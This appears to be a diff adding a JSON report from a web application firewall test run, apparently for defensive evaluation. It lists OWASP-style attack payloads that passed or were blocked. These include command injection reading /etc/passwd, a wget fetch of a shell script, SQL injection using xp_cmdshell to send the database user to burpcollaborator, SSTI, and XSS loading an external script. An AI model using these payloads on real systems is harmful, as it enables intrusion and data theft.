+                "payload": "!!python/object/new:exec [import socket; socket.gethostbyname('somehost.burpcollaborator.net')]",
+                "test_set": "owasp",
+                "test_case": "rce-urlparam",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "; cat /et'c/pa'ss'wd",
+                "test_set": "owasp",
+                "test_case": "rce-urlpath",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "ax--exec=`id`--remote=origin",
+                "test_set": "owasp",
+                "test_case": "rce-urlpath",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "cmd=127.0.0.1 \u0026\u0026 ls /etc",
+                "test_set": "owasp",
+                "test_case": "rce-urlpath",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "ax--exec=`id`--remote=origin",
+                "test_set": "owasp",
+                "test_case": "rce",
+                "encoder": "Plain",
+                "placeholder": "Plain",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "cmd=127.0.0.1 \u0026\u0026 ls /etc",
+                "test_set": "owasp",
+                "test_case": "rce",
+                "encoder": "Plain",
+                "placeholder": "Plain",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "; cat /et'c/pa'ss'wd",
+                "test_set": "owasp",
+                "test_case": "rce",
+                "encoder": "Plain",
+                "placeholder": "Plain",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": ";wget http://some_host/sh311.sh",
+                "test_set": "owasp",
+                "test_case": "shell-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "|getent+hosts+somehost.burpcollaborator.net.\u0026",
+                "test_set": "owasp",
+                "test_case": "shell-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "|getent+hosts+somehost.burpcollaborator.net.\u0026",
+                "test_set": "owasp",
+                "test_case": "shell-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "|getent+hosts+somehost.burpcollaborator.net.\u0026",
+                "test_set": "owasp",
+                "test_case": "shell-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "|getent+hosts+somehost.burpcollaborator.net.\u0026",
+                "test_set": "owasp",
+                "test_case": "shell-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "|getent+hosts+somehost.burpcollaborator.net.\u0026",
+                "test_set": "owasp",
+                "test_case": "shell-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "|getent+hosts+somehost.burpcollaborator.net.\u0026",
+                "test_set": "owasp",
+                "test_case": "shell-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "| set /a 3482*7301",
+                "test_set": "owasp",
+                "test_case": "shell-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "| set /a 3482*7301",
+                "test_set": "owasp",
+                "test_case": "shell-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "| set /a 3482*7301",
+                "test_set": "owasp",
+                "test_case": "shell-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "| set /a 3482*7301",
+                "test_set": "owasp",
+                "test_case": "shell-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "| set /a 3482*7301",
+                "test_set": "owasp",
+                "test_case": "shell-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "| set /a 3482*7301",
+                "test_set": "owasp",
+                "test_case": "shell-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'%22+(select(0)from(select(sleep(15)))v)+%22*/",
+                "test_set": "owasp",
+                "test_case": "sql-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'%22+(select(0)from(select(sleep(15)))v)+%22*/",
+                "test_set": "owasp",
+                "test_case": "sql-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "3;/* a */ DECLARE @c varchar(255);/* b */SELECT @c='ping '+master.sys.fn_varbintohexstr(convert(varbinary,SYSTEM_USER))+'.000.burpcol'+'laborator.net';/*xx*/ EXEC Master.dbo.xp_cmdshell @c;/*xxx*/ EXEC sp_SYS_ProtoOp @id=3",
+                "test_set": "owasp",
+                "test_case": "sql-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "3;/* a */ DECLARE @c varchar(255);/* b */SELECT @c='ping '+master.sys.fn_varbintohexstr(convert(varbinary,SYSTEM_USER))+'.000.burpcol'+'laborator.net';/*xx*/ EXEC Master.dbo.xp_cmdshell @c;/*xxx*/ EXEC sp_SYS_ProtoOp @id=3",
+                "test_set": "owasp",
+                "test_case": "sql-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "3;/* a */ DECLARE @c varchar(255);/* b */SELECT @c='ping '+master.sys.fn_varbintohexstr(convert(varbinary,SYSTEM_USER))+'.000.burpcol'+'laborator.net';/*xx*/ EXEC Master.dbo.xp_cmdshell @c;/*xxx*/ EXEC sp_SYS_ProtoOp @id=3",
+                "test_set": "owasp",
+                "test_case": "sql-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "-1134')  OR JSON_EXTRACT('{''aKER'': 9648}', '$.aKER') = 9648*7799 AND ('QlYa' LIKE 'QlYa",
+                "test_set": "owasp",
+                "test_case": "sql-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "-1134')  OR JSON_EXTRACT('{''aKER'': 9648}', '$.aKER') = 9648*7799 AND ('QlYa' LIKE 'QlYa",
+                "test_set": "owasp",
+                "test_case": "sql-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "123) AND 12=12  AND JSON_DEPTH('{}') != 2521",
+                "test_set": "owasp",
+                "test_case": "sql-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "123) AND 12=12  AND JSON_DEPTH('{}') != 2521",
+                "test_set": "owasp",
+                "test_case": "sql-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "aaaa\\u0027%2b#{16*8787}%2b\\u0027bbb",
+                "test_set": "owasp",
+                "test_case": "sst-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "aaaa\\u0027%2b#{16*8787}%2b\\u0027bbb",
+                "test_set": "owasp",
+                "test_case": "sst-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "{{1337*1338}}",
+                "test_set": "owasp",
+                "test_case": "sst-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "{{1337*1338}}",
+                "test_set": "owasp",
+                "test_case": "sst-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "{{1337*1338}}",
+                "test_set": "owasp",
+                "test_case": "sst-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "{{1337*1338}}",
+                "test_set": "owasp",
+                "test_case": "sst-injection",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "{{1337*1338}}",
+                "test_set": "owasp",
+                "test_case": "sst-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "{{1337*1338}}",
+                "test_set": "owasp",
+                "test_case": "sst-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "{{1337*1338}}",
+                "test_set": "owasp",
+                "test_case": "sst-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "{{1337*1338}}",
+                "test_set": "owasp",
+                "test_case": "sst-injection",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "\u003cimg src=x onerror=alert(document.domain)\u003e/all",
+                "test_set": "owasp",
+                "test_case": "xss-scripting",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "\"Onx=() onMouSeoVer=prompt(1)\u003e",
+                "test_set": "owasp",
+                "test_case": "xss-scripting",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "\\\"autof\u003cx\u003eocus o\u003cx\u003enfocus=alert\u003cx\u003e(1)//",
+                "test_set": "owasp",
+                "test_case": "xss-scripting",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "\\\"autof\u003cx\u003eocus o\u003cx\u003enfocus=alert\u003cx\u003e(1)//",
+                "test_set": "owasp",
+                "test_case": "xss-scripting",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 200,
+                "test_result": "failed"
+            },
+            {
+                "payload": "\u003c\u003cscr\u0000ipt/src=http://xss.com/xss.js\u003e\u003c/script",
+                "test_set": "owasp",
+                "test_case": "xss-scripting",
+                "encoder": "Base64Flat",
+                "placeholder": "Base64Flat",
+                "status": 200,
+                "test_result": "failed"
+            }
+        ],
+        "unresolved": [
+            {
+                "payload": "\u003cscript\u003eaaa\u003c/script\u003e",
+                "test_set": "owasp-api",
+                "test_case": "non-crud",
+                "encoder": "Plain",
+                "placeholder": "Plain",
+                "status": 405,
+                "test_result": "unknown"
+            },
+            {
+                "payload": "1e1 union select users from password",
+                "test_set": "owasp-api",
+                "test_case": "non-crud",
+                "encoder": "Plain",
+                "placeholder": "Plain",
+                "status": 405,
+                "test_result": "unknown"
+            }
+        ]
+    },
+    "true_negative_tests_payloads": {
+        "blocked": [
+            {
+                "payload": "union was a great select",
+                "test_set": "false-pos",
+                "test_case": "texts",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 403,
+                "test_result": "failed"
+            },
+            {
+                "payload": "union was a great select",
+                "test_set": "false-pos",
+                "test_case": "texts",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 403,
+                "test_result": "failed"
+            },
+            {
+                "payload": "union was a great select",
+                "test_set": "false-pos",
+                "test_case": "texts",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 403,
+                "test_result": "failed"
+            },
+            {
+                "payload": "john+or@var.es",
+                "test_set": "false-pos",
+                "test_case": "texts",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 403,
+                "test_result": "failed"
+            },
+            {
+                "payload": "john+or@var.es",
+                "test_set": "false-pos",
+                "test_case": "texts",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 403,
+                "test_result": "failed"
+            },
+            {
+                "payload": "john+or@var.es",
+                "test_set": "false-pos",
+                "test_case": "texts",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 403,
+                "test_result": "failed"
+            },
+            {
+                "payload": "zsh is the best!",
+                "test_set": "false-pos",
+                "test_case": "texts",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 403,
+                "test_result": "failed"
+            },
+            {
+                "payload": "zsh is the best!",
+                "test_set": "false-pos",
+                "test_case": "texts",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 403,
+                "test_result": "failed"
+            },
+            {
+                "payload": "JavaScript: Basics of JavaScript Language",
+                "test_set": "false-pos",
+                "test_case": "texts",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 403,
+                "test_result": "failed"
+            },
+            {
+                "payload": "JavaScript: Basics of JavaScript Language",
+                "test_set": "false-pos",
+                "test_case": "texts",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 403,
+                "test_result": "failed"
+            },
+            {
+                "payload": "ls 300 lexus",
+                "test_set": "false-pos",
+                "test_case": "texts",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 403,
+                "test_result": "failed"
+            },
+            {
+                "payload": "JavaScript: Basics of JavaScript Language",
+                "test_set": "false-pos",
+                "test_case": "texts",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 403,
+                "test_result": "failed"
+            },
+            {
+                "payload": "ls 300 lexus",
+                "test_set": "false-pos",
+                "test_case": "texts",
+                "encoder": "URL",
+                "placeholder": "URL",
+                "status": 403,
+                "test_result": "failed"
+            }
+        ]
+    }
+}
